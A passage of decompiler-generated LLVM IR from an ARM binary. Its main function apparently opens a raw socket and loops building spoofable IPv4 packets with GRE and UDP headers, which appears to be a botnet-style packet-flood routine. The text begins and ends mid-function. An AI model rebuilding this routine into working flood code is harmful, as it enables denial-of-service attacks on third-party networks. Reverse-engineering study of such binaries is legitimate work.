  uselistorder i32 %v3_a9c0, { 2, 1, 0 }
  uselistorder i32 %v3_a9ac, { 2, 1, 0 }
  uselistorder i32 %v3_a98c, { 1, 0 }
  uselistorder i32 %v1_a984, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_a974, { 1, 0 }
  uselistorder i1 %v7_a964, { 1, 0 }
  uselistorder i1 %v7_a938, { 1, 0 }
  uselistorder i32 %v3_a934, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v5_a920, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v5_a8cc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a880, { 1, 0, 2 }
  uselistorder i8 %v5_a838, { 2, 0, 1 }
  uselistorder i32 %v2_a800, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 10, 11, 12, 13, 14, 15, 16, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 31, 32, 33, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 26, 27, 28, 19, 20, 21, 22, 23, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 18, 14, 15, 16, 19, 20, 21, 23, 22, 24, 25, 27, 26, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 60, 1, 2, 4, 5, 3, 6, 8, 7, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 19, 20, 21, 23, 22, 24, 26, 25, 28, 27, 43, 42, 44, 47, 45, 30, 29, 31, 32, 33, 35, 34, 36, 38, 37, 39, 40, 41, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 14, 15, 16, 17, 20, 21, 22 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aca8, { 1, 0 }
  uselistorder label %dec_label_pc_ac44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_abbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_abbc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ab98, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_aa88, { 1, 0 }
  uselistorder label %dec_label_pc_a9e8, { 1, 0 }
}

define i32 @function_ae40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae40:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ae40 = load i32, i32* @r4, align 4
  %v18_ae40 = load i32, i32* @sb, align 4
  %v24_ae40 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_ae5c = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_ae60 = load i32, i32* @r5, align 4
  store i32 %v0_ae60, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_ae70 = load i32, i32* @r4, align 4
  %v5_ae74 = inttoptr i32 %v0_ae60 to i32*
  %v6_ae74 = call i32 @function_a430(i32 %v0_ae70, i32* %v5_ae74, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ae8c = load i32, i32* @r5, align 4
  store i32 %v0_ae8c, i32* %r1.global-to-local, align 4
  %v0_ae90 = load i32, i32* @r4, align 4
  %v5_ae94 = trunc i32 %v6_ae74 to i8
  %v6_ae98 = inttoptr i32 %v0_ae8c to i32*
  %v7_ae98 = call i32 @function_a430(i32 %v0_ae90, i32* %v6_ae98, i32 3, i32 65535)
  %v0_ae9c = load i32, i32* @r5, align 4
  store i32 %v0_ae9c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_ae98, i32* %fp.global-to-local, align 4
  %v0_aeac = load i32, i32* @r4, align 4
  %v4_aeb0 = inttoptr i32 %v0_ae9c to i32*
  %v5_aeb0 = call i32 @function_a430(i32 %v0_aeac, i32* %v4_aeb0, i32 4, i32 64)
  %v0_aebc = load i32, i32* @r5, align 4
  store i32 %v0_aebc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aec8 = load i32, i32* @r4, align 4
  %v6_aed0 = inttoptr i32 %v0_aebc to i32*
  %v7_aed0 = call i32 @function_a430(i32 %v0_aec8, i32* %v6_aed0, i32 5, i32 1)
  %v1_aedc = urem i32 %v7_aed0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_aee8 = load i32, i32* @r5, align 4
  store i32 %v0_aee8, i32* %r1.global-to-local, align 4
  %v0_aeec = load i32, i32* @r4, align 4
  %v5_aef4 = inttoptr i32 %v0_aee8 to i32*
  %v6_aef4 = call i32 @function_a430(i32 %v0_aeec, i32* %v5_aef4, i32 6, i32 65535)
  %v0_aefc = load i32, i32* @r5, align 4
  store i32 %v0_aefc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_aef4, i32* %sb.global-to-local, align 4
  %v0_af0c = load i32, i32* @r4, align 4
  %v4_af10 = inttoptr i32 %v0_aefc to i32*
  %v5_af10 = call i32 @function_a430(i32 %v0_af0c, i32* %v4_af10, i32 7, i32 65535)
  %v0_af14 = load i32, i32* @r5, align 4
  store i32 %v0_af14, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_af10, i32* @r7, align 4
  %v0_af24 = load i32, i32* @r4, align 4
  %v4_af28 = inttoptr i32 %v0_af14 to i32*
  %v5_af28 = call i32 @function_a430(i32 %v0_af24, i32* %v4_af28, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_af38 = load i32, i32* @r5, align 4
  store i32 %v0_af38, i32* %r1.global-to-local, align 4
  %v0_af3c = load i32, i32* @r4, align 4
  %v4_af40 = inttoptr i32 %v0_af38 to i32*
  %v5_af40 = call i32 @function_a430(i32 %v0_af3c, i32* %v4_af40, i32 1, i32 1)
  %v1_af48 = urem i32 %v5_af40, 256
  %v0_af4c = load i32, i32* @r5, align 4
  store i32 %v0_af4c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_af58 = load i32, i32* @r4, align 4
  %v5_af60 = inttoptr i32 %v0_af4c to i32*
  %v6_af60 = call i32 @function_a430(i32 %v0_af58, i32* %v5_af60, i32 19, i32 0)
  %v0_af68 = load i32, i32* @r5, align 4
  store i32 %v0_af68, i32* %r1.global-to-local, align 4
  %v2_af6c = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_af6c, i32* %r3.global-to-local, align 4
  store i32 %v6_af60, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_af78 = load i32, i32* @r4, align 4
  %v4_af7c = inttoptr i32 %v0_af68 to i32*
  %v5_af7c = call i32 @function_a430(i32 %v0_af78, i32* %v4_af7c, i32 25, i32 %v2_af6c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_af90 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_af90, i32* @r0, align 4
  %v7_af94 = icmp eq i32 %v3_af90, -1
  store i1 %v7_af94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af94, label %dec_label_pc_b1d4, label %dec_label_pc_afa0

dec_label_pc_afa0:                                ; preds = %dec_label_pc_ae40
  store i32 1, i32* %stack_var_-44, align 4
  %v6_afa8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_afa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_afbc = call i32 @function_14ae4(i32 %v3_af90, i32 0, i32 3, i32 %v6_afa8, i32 4)
  %v7_afc0 = icmp eq i32 %v5_afbc, -1
  store i1 %v7_afc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_afc0, label %dec_label_pc_b1cc, label %dec_label_pc_afc8

dec_label_pc_afc8:                                ; preds = %dec_label_pc_afa0
  %v0_afc8 = load i32, i32* %sb.global-to-local, align 4
  %v0_afcc = load i32, i32* @r7, align 4
  %v0_afd0 = load i32, i32* %fp.global-to-local, align 4
  %v3_afd0 = mul i32 %v0_afd0, 65536
  store i32 %v3_afd0, i32* %r3.global-to-local, align 4
  %v3_afd8 = urem i32 %v0_afc8, 65536
  store i32 %v3_afd8, i32* %r2.global-to-local, align 4
  %v3_afdc = urem i32 %v0_afcc, 65536
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v0_afe0 = load i32, i32* @r6, align 4
  %v1_afe0 = urem i32 %v0_afe0, 256
  store i32 %v1_afe0, i32* @r6, align 4
  %v0_afe4 = load i32, i32* @r8, align 4
  %v2_afe4 = icmp eq i32 %v0_afe4, 0
  store i1 %v2_afe4, i1* %cpsr_z.global-to-local, align 1
  %v3_afe8 = urem i32 %v0_afd0, 65536
  store i32 %v3_afe8, i32* @sb, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_afe4, label %dec_label_pc_b404, label %dec_label_pc_b000

dec_label_pc_b000:                                ; preds = %dec_label_pc_afc8
  %v3_b008 = mul i32 %v5_af28, 65536
  %v1_b00c = add i32 %v3_b008, 524288
  %v1_b010 = add i32 %v3_b008, 3407872
  %v1_b018 = add i32 %v3_b008, 1835008
  %v3_b01c = udiv i32 %v1_b010, 65536
  store i32 %v3_b01c, i32* %r1.global-to-local, align 4
  %v3_b020 = udiv i32 %v1_b018, 65536
  store i32 %v3_b020, i32* %r3.global-to-local, align 4
  %v3_b024 = xor i32 %v3_afe8, 65535
  store i32 %v3_b024, i32* %r2.global-to-local, align 4
  %v3_b028 = udiv i32 %v1_b00c, 65536
  store i32 %v3_b028, i32* @fp, align 4
  store i32 0, i32* @r4, align 4
  %v4_b16c = sext i8 %v5_ae94 to i32
  %v2_b190 = icmp eq i32 %v1_aedc, 0
  %v2_b0dc = icmp eq i32 %v1_afe0, 0
  %sext = mul i32 %v5_aeb0, 16777216
  %v4_b18c = sdiv i32 %sext, 16777216
  br label %dec_label_pc_b12c

dec_label_pc_b040:                                ; preds = %dec_label_pc_b12c, %dec_label_pc_b1ac
  %v2_b044 = phi i32 [ %v0_b19c, %dec_label_pc_b12c ], [ %v2_b044.pre, %dec_label_pc_b1ac ]
  %v3_b044 = add i32 %v2_b044, 9
  %v4_b044 = inttoptr i32 %v3_b044 to i8*
  store i8 47, i8* %v4_b044, align 1
  %v3_b048 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b048, i32* %r2.global-to-local, align 4
  store i32 %v5_af7c, i32* %r1.global-to-local, align 4
  %v3_b050 = mul i32 %v3_b048, 32
  store i32 %v3_b050, i32* %r3.global-to-local, align 4
  %v1_b054 = load i32, i32* %r4.global-to-local, align 4
  %v2_b054 = add i32 %v1_b054, 12
  %v3_b054 = inttoptr i32 %v2_b054 to i32*
  store i32 %v5_af7c, i32* %v3_b054, align 4
  %v0_b058 = load i32, i32* %r3.global-to-local, align 4
  %v1_b058 = load i32, i32* %r2.global-to-local, align 4
  %tmp = mul i32 %v1_b058, -8
  %v5_b058 = add i32 %v0_b058, %tmp
  %v1_b05c = load i32, i32* @sl, align 4
  %v2_b05c = add i32 %v1_b05c, %v5_b058
  store i32 %v2_b05c, i32* %r3.global-to-local, align 4
  %v1_b060 = add i32 %v2_b05c, 16
  %v2_b060 = inttoptr i32 %v1_b060 to i32*
  %v3_b060 = load i32, i32* %v2_b060, align 4
  store i32 %v3_b060, i32* %r2.global-to-local, align 4
  %v1_b068 = load i32, i32* %r4.global-to-local, align 4
  %v2_b068 = add i32 %v1_b068, 16
  %v3_b068 = inttoptr i32 %v2_b068 to i32*
  store i32 %v3_b060, i32* %v3_b068, align 4
  %v1_b06c = call i32 @function_1484c(i32 2048)
  %v2_b06c = trunc i32 %v1_b06c to i16
  %v3_b070 = load i32, i32* @r7, align 4
  %v4_b070 = add i32 %v3_b070, 2
  %v5_b070 = inttoptr i32 %v4_b070 to i16*
  store i16 %v2_b06c, i16* %v5_b070, align 2
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %tmp53 = urem i8 %v3_b074, 16
  %v1_b078 = zext i8 %tmp53 to i32
  %v1_b07c = or i32 %v1_b078, 64
  store i32 %v1_b07c, i32* %r3.global-to-local, align 4
  %v1_b080 = trunc i32 %v1_b07c to i8
  store i8 %v1_b080, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r4.global-to-local, align 4
  %v1_b084 = add i32 %v0_b084, 24
  %v2_b084 = inttoptr i32 %v1_b084 to i8*
  %v3_b084 = load i8, i8* %v2_b084, align 1
  %v1_b088 = and i8 %v3_b084, -16
  %v1_b08c = or i8 %v1_b088, 5
  store i8 %v1_b08c, i8* %v2_b084, align 1
  store i32 %v4_b16c, i32* %r2.global-to-local, align 4
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 1
  %v4_b098 = inttoptr i32 %v3_b098 to i8*
  store i8 %v5_ae94, i8* %v4_b098, align 1
  %v1_b0a0 = call i32 @function_1484c(i32 %v3_b020)
  %v2_b0a0 = trunc i32 %v1_b0a0 to i16
  %v3_b0a4 = load i32, i32* @r5, align 4
  %v4_b0a4 = add i32 %v3_b0a4, 2
  %v5_b0a4 = inttoptr i32 %v4_b0a4 to i16*
  store i16 %v2_b0a0, i16* %v5_b0a4, align 2
  %v1_b0ac = call i32 @function_1484c(i32 %v3_b024)
  %v2_b0ac = trunc i32 %v1_b0ac to i16
  store i32 %v4_b18c, i32* %r1.global-to-local, align 4
  store i32 %v1_aedc, i32* %r3.global-to-local, align 4
  store i1 %v2_b190, i1* %cpsr_z.global-to-local, align 1
  %v3_b0bc = load i32, i32* @r5, align 4
  %v4_b0bc = add i32 %v3_b0bc, 4
  %v5_b0bc = inttoptr i32 %v4_b0bc to i16*
  store i16 %v2_b0ac, i16* %v5_b0bc, align 2
  %v0_b0c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b0c0 = trunc i32 %v0_b0c0 to i8
  %v2_b0c0 = load i32, i32* @r5, align 4
  %v3_b0c0 = add i32 %v2_b0c0, 8
  %v4_b0c0 = inttoptr i32 %v3_b0c0 to i8*
  store i8 %v1_b0c0, i8* %v4_b0c0, align 1
  %v0_b0c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0c4, label %dec_label_pc_b0c8, label %dec_label_pc_b1bc

dec_label_pc_b0c8:                                ; preds = %dec_label_pc_b040, %dec_label_pc_b1bc
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_b0cc = load i32, i32* @r5, align 4
  %v3_b0cc = add i32 %v2_b0cc, 9
  %v4_b0cc = inttoptr i32 %v3_b0cc to i8*
  store i8 17, i8* %v4_b0cc, align 1
  %v0_b0d0 = call i32 @function_f570()
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b0dc, i1* %cpsr_z.global-to-local, align 1
  %v1_b0e0 = sub i32 1023, %v0_b0d0
  store i32 %v1_b0e0, i32* %r3.global-to-local, align 4
  br i1 %v2_b0dc, label %.thread, label %.thread3

.thread:                                          ; preds = %dec_label_pc_b0c8
  %v2_b0e8 = load i32, i32* @r5, align 4
  %v3_b0e8 = add i32 %v2_b0e8, 16
  %v4_b0e8 = inttoptr i32 %v3_b0e8 to i32*
  store i32 %v1_b0e0, i32* %v4_b0e8, align 4
  br label %bb

.thread3:                                         ; preds = %dec_label_pc_b0c8
  %v1_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b0e4 = add i32 %v1_b0e4, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  %v4_b0e4 = load i32, i32* %v3_b0e4, align 4
  store i32 %v4_b0e4, i32* %r3.global-to-local, align 4
  %v2_b0ec = load i32, i32* @r5, align 4
  %v3_b0ec = add i32 %v2_b0ec, 16
  %v4_b0ec = inttoptr i32 %v3_b0ec to i32*
  store i32 %v4_b0e4, i32* %v4_b0ec, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread3
  %v1_b0f0 = load i32, i32* @r5, align 4
  %v2_b0f0 = add i32 %v1_b0f0, 12
  %v3_b0f0 = inttoptr i32 %v2_b0f0 to i32*
  store i32 %v0_b0d0, i32* %v3_b0f0, align 4
  %v1_b0f8 = call i32 @function_1484c(i32 %v3_afd8)
  %v2_b0f8 = trunc i32 %v1_b0f8 to i16
  %v3_b0fc = load i32, i32* @r6, align 4
  %v4_b0fc = inttoptr i32 %v3_b0fc to i16*
  store i16 %v2_b0f8, i16* %v4_b0fc, align 2
  %v1_b104 = call i32 @function_1484c(i32 %v3_afdc)
  %v2_b104 = trunc i32 %v1_b104 to i16
  %v3_b108 = load i32, i32* @r6, align 4
  %v4_b108 = add i32 %v3_b108, 2
  %v5_b108 = inttoptr i32 %v4_b108 to i16*
  store i16 %v2_b104, i16* %v5_b108, align 2
  %v0_b10c = load i32, i32* @fp, align 4
  %v1_b110 = call i32 @function_1484c(i32 %v0_b10c)
  %v2_b110 = trunc i32 %v1_b110 to i16
  %v3_b114 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b114, i32* %r3.global-to-local, align 4
  %v1_b118 = add i32 %v3_b114, 1
  store i32 %v1_b118, i32* @r4, align 4
  %v1_b11c = load i32, i32* @r8, align 4
  %v9_b11c = icmp eq i32 %v1_b118, %v1_b11c
  store i1 %v9_b11c, i1* %cpsr_z.global-to-local, align 1
  %v3_b120 = load i32, i32* @r6, align 4
  %v4_b120 = add i32 %v3_b120, 4
  %v5_b120 = inttoptr i32 %v4_b120 to i16*
  store i16 %v2_b110, i16* %v5_b120, align 2
  %v0_b124 = load i32, i32* @r4, align 4
  store i32 %v0_b124, i32* %stack_var_-44, align 4
  %v6_b128 = icmp slt i32 %v1_b118, %v1_b11c
  br i1 %v6_b128, label %dec_label_pc_b12c, label %dec_label_pc_b1e0

dec_label_pc_b12c:                                ; preds = %bb, %dec_label_pc_b000
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_b138 = call i32 @function_1320c(i32 1510, i32 4)
  store i32 %v2_ae5c, i32* %r2.global-to-local, align 4
  %v3_b140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b140, i32* %r3.global-to-local, align 4
  %v2_b144 = load i32, i32* @r4, align 4
  %v5_b144 = mul i32 %v2_b144, 4
  %v6_b144 = add i32 %v5_b144, %v2_ae5c
  %v7_b144 = inttoptr i32 %v6_b144 to i32*
  store i32 %v2_b138, i32* %v7_b144, align 4
  %v0_b148 = load i32, i32* %r2.global-to-local, align 4
  %v1_b148 = load i32, i32* %r3.global-to-local, align 4
  %v4_b148 = mul i32 %v1_b148, 4
  %v5_b148 = add i32 %v4_b148, %v0_b148
  %v6_b148 = inttoptr i32 %v5_b148 to i32*
  %v7_b148 = load i32, i32* %v6_b148, align 4
  store i32 %v7_b148, i32* %r4.global-to-local, align 4
  %v1_b14c = inttoptr i32 %v7_b148 to i8*
  %v2_b14c = load i8, i8* %v1_b14c, align 1
  %tmp54 = urem i8 %v2_b14c, 16
  %v1_b150 = zext i8 %tmp54 to i32
  %v1_b154 = or i32 %v1_b150, 64
  store i32 %v1_b154, i32* %r2.global-to-local, align 4
  %v1_b158 = trunc i32 %v1_b154 to i8
  store i8 %v1_b158, i8* %v1_b14c, align 1
  %v0_b15c = load i32, i32* %r4.global-to-local, align 4
  %v1_b15c = inttoptr i32 %v0_b15c to i8*
  %v2_b15c = load i8, i8* %v1_b15c, align 1
  %v1_b160 = and i8 %v2_b15c, -16
  %v1_b164 = or i8 %v1_b160, 5
  store i8 %v1_b164, i8* %v1_b15c, align 1
  store i32 %v4_b16c, i32* %r3.global-to-local, align 4
  %v2_b170 = load i32, i32* %r4.global-to-local, align 4
  %v3_b170 = add i32 %v2_b170, 1
  %v4_b170 = inttoptr i32 %v3_b170 to i8*
  store i8 %v5_ae94, i8* %v4_b170, align 1
  %v1_b178 = call i32 @function_1484c(i32 %v3_b01c)
  %v2_b178 = trunc i32 %v1_b178 to i16
  %v3_b17c = load i32, i32* %r4.global-to-local, align 4
  %v4_b17c = add i32 %v3_b17c, 2
  %v5_b17c = inttoptr i32 %v4_b17c to i16*
  store i16 %v2_b178, i16* %v5_b17c, align 2
  %v0_b180 = load i32, i32* @sb, align 4
  %v1_b184 = call i32 @function_1484c(i32 %v0_b180)
  %v2_b184 = trunc i32 %v1_b184 to i16
  store i32 %v1_aedc, i32* %r1.global-to-local, align 4
  store i32 %v4_b18c, i32* %r2.global-to-local, align 4
  store i1 %v2_b190, i1* %cpsr_z.global-to-local, align 1
  %v3_b194 = load i32, i32* %r4.global-to-local, align 4
  %v4_b194 = add i32 %v3_b194, 4
  %v5_b194 = inttoptr i32 %v4_b194 to i16*
  store i16 %v2_b184, i16* %v5_b194, align 2
  %v0_b198 = load i32, i32* %r2.global-to-local, align 4
  %v1_b198 = trunc i32 %v0_b198 to i8
  %v2_b198 = load i32, i32* %r4.global-to-local, align 4
  %v3_b198 = add i32 %v2_b198, 8
  %v4_b198 = inttoptr i32 %v3_b198 to i8*
  store i8 %v1_b198, i8* %v4_b198, align 1
  %v0_b19c = load i32, i32* %r4.global-to-local, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  store i32 %v1_b19c, i32* @r5, align 4
  %v1_b1a0 = add i32 %v0_b19c, 44
  store i32 %v1_b1a0, i32* @r6, align 4
  %v1_b1a4 = add i32 %v0_b19c, 20
  store i32 %v1_b1a4, i32* @r7, align 4
  %v0_b1a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b1a8, label %dec_label_pc_b040, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b12c
  %v1_b1b0 = call i32 @function_1484c(i32 16384)
  %v2_b1b0 = trunc i32 %v1_b1b0 to i16
  %v3_b1b4 = load i32, i32* %r4.global-to-local, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 6
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v2_b1b0, i16* %v5_b1b4, align 2
  %v2_b044.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b040

dec_label_pc_b1bc:                                ; preds = %dec_label_pc_b040
  %v1_b1c0 = call i32 @function_1484c(i32 16384)
  %v2_b1c0 = trunc i32 %v1_b1c0 to i16
  %v3_b1c4 = load i32, i32* @r5, align 4
  %v4_b1c4 = add i32 %v3_b1c4, 6
  %v5_b1c4 = inttoptr i32 %v4_b1c4 to i16*
  store i16 %v2_b1c0, i16* %v5_b1c4, align 2
  br label %dec_label_pc_b0c8

dec_label_pc_b1cc:                                ; preds = %dec_label_pc_afa0
  store i32 %v3_af90, i32* @r0, align 4
  %v1_b1d0 = call i32 @function_15b20(i32 %v3_af90)
  br label %dec_label_pc_b1d4

dec_label_pc_b1d4:                                ; preds = %dec_label_pc_ae40, %dec_label_pc_b1cc
  %v1_b1dc = phi i32 [ %v3_af90, %dec_label_pc_ae40 ], [ %v1_b1d0, %dec_label_pc_b1cc ]
  store i32 %v3_ae40, i32* %r4.global-to-local, align 4
  store i32 %v18_ae40, i32* %sb.global-to-local, align 4
  store i32 %v24_ae40, i32* %fp.global-to-local, align 4
  ret i32 %v1_b1dc

dec_label_pc_b1e0:                                ; preds = %bb
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v1_b1e8 = add i32 %v5_af28, 8
  store i32 %v1_b1e8, i32* %r3.global-to-local, align 4
  %v0_b1f8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_b1f4.preheader

dec_label_pc_b1f4.preheader:                      ; preds = %dec_label_pc_b1e0, %dec_label_pc_b404
  %v0_b1f8.pre = phi i32 [ %v0_b1f8.pre.pre, %dec_label_pc_b1e0 ], [ 0, %dec_label_pc_b404 ]
  %stack_var_-108.0.ph = phi i32 [ %v1_b1e8, %dec_label_pc_b1e0 ], [ %v1_b40c, %dec_label_pc_b404 ]
  %storemerge = add i32 %v5_af28, 52
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  %v3_b364 = icmp eq i32 %v5_af7c, -1
  %v8_b364 = icmp eq i32 %v5_af7c, -1
  %v2_b3cc = icmp eq i32 %v1_afe0, 0
  %v2_b3e8 = icmp eq i32 %v1_af48, 0
  br label %dec_label_pc_b1f4

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b1f4, %dec_label_pc_b284, %dec_label_pc_b1f4.preheader
  %v0_b1f8 = phi i32 [ %v0_b1f8.pre, %dec_label_pc_b1f4.preheader ], [ 0, %dec_label_pc_b1f4 ], [ %v1_b324, %dec_label_pc_b284 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1f8 = icmp eq i32 %v0_b1f8, 0
  store i1 %v2_b1f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1f8, label %dec_label_pc_b1f4, label %dec_label_pc_b204

dec_label_pc_b204:                                ; preds = %dec_label_pc_b1f4
  br label %dec_label_pc_b208

dec_label_pc_b208:                                ; preds = %dec_label_pc_b284, %dec_label_pc_b204
  %v1_b21c = phi i32 [ %v1_b320, %dec_label_pc_b284 ], [ 0, %dec_label_pc_b204 ]
  %v5_b20c = mul i32 %v1_b21c, 24
  %v1_b210 = load i32, i32* @sl, align 4
  %v2_b210 = add i32 %v1_b210, %v5_b20c
  store i32 %v2_b210, i32* %r3.global-to-local, align 4
  store i32 %v2_ae5c, i32* %r1.global-to-local, align 4
  %v1_b218 = add i32 %v2_b210, 20
  %v2_b218 = inttoptr i32 %v1_b218 to i8*
  %v3_b218 = load i8, i8* %v2_b218, align 1
  %v4_b218 = zext i8 %v3_b218 to i32
  store i32 %v4_b218, i32* %r2.global-to-local, align 4
  %v4_b21c = mul i32 %v1_b21c, 4
  %v5_b21c = add i32 %v4_b21c, %v2_ae5c
  %v6_b21c = inttoptr i32 %v5_b21c to i32*
  %v7_b21c = load i32, i32* %v6_b21c, align 4
  store i32 %v7_b21c, i32* @r5, align 4
  %v7_b220 = icmp eq i8 %v3_b218, 31
  store i1 %v7_b220, i1* %cpsr_z.global-to-local, align 1
  %v1_b224 = add i32 %v7_b21c, 24
  store i32 %v1_b224, i32* @r6, align 4
  %v1_b228 = add i32 %v7_b21c, 44
  store i32 %v1_b228, i32* @r7, align 4
  %tmp55 = icmp ult i8 %v3_b218, 32
  br i1 %tmp55, label %dec_label_pc_b334, label %dec_label_pc_b230

dec_label_pc_b230:                                ; preds = %dec_label_pc_b208
  store i32 %v5_af7c, i32* %r2.global-to-local, align 4
  store i1 %v8_b364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b364, label %dec_label_pc_b370, label %dec_label_pc_b23c

dec_label_pc_b23c:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b230
  store i32 65535, i32* @r4, align 4
  %v0_b244 = load i32, i32* @sb, align 4
  %v9_b244 = icmp eq i32 %v0_b244, 65535
  store i1 %v9_b244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b244, label %dec_label_pc_b388, label %dec_label_pc_b24c

dec_label_pc_b24c:                                ; preds = %dec_label_pc_b370.dec_label_pc_b24c_crit_edge, %dec_label_pc_b23c
  %v1_b250 = phi i32 [ %v1_b250.pre, %dec_label_pc_b370.dec_label_pc_b24c_crit_edge ], [ 65535, %dec_label_pc_b23c ]
  store i32 %v3_afd8, i32* %r3.global-to-local, align 4
  %v9_b250 = icmp eq i32 %v3_afd8, %v1_b250
  store i1 %v9_b250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b250, label %dec_label_pc_b3b0, label %dec_label_pc_b258

dec_label_pc_b258:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b24c
